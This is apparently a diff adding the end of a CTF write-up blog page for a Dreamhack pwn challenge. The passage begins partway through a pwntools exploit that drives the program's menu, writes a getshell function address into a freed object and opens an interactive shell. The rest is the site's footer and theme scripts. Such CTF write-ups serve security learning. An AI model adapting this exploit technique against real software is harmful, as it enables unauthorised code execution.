+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#create applemango</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#send &#34;name&#34;</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(p64(getshell))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#eat applemango</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><hr>
+<p>As always, the full code can be found on my GitHub
+<strong><a href="https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/send_sig.py">here</a></strong>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/dreamhack/">Dreamhack</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/pwn/">Pwn</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
